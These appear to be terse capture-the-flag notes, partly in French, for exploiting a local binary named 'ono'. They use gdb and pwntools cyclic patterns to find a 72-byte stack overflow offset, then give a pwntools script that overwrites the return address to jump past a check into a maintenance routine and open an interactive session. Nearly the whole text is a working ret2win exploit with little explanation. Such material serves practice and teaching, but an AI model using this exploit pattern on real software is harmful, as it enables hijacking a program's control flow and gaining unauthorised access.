pwn cyclic 200 > /tmp/a
env -i gdb ./ono
(gdb) disas run_diagnostic
(gdb) break *0x00000000004013bd
(gdb) run < /tmp/a
(gdb) i s -> prendre #1
pwn cyclic -l <#1 valeur>


(gdb) disas maintenance_exec
Prendre l'addr apres le check et enfin le script:

from pwn import *

context.arch = 'amd64'
context.os   = 'linux'

target = <TARGET_ADDR_JMP>
offset = 72

payload = b'A' * offset
payload += p64(target)
with open("/tmp/payload", "wb") as f:
    f.write(payload)

p = process(['env', '-i', './ono'])
p.sendline(payload)
p.interactive()

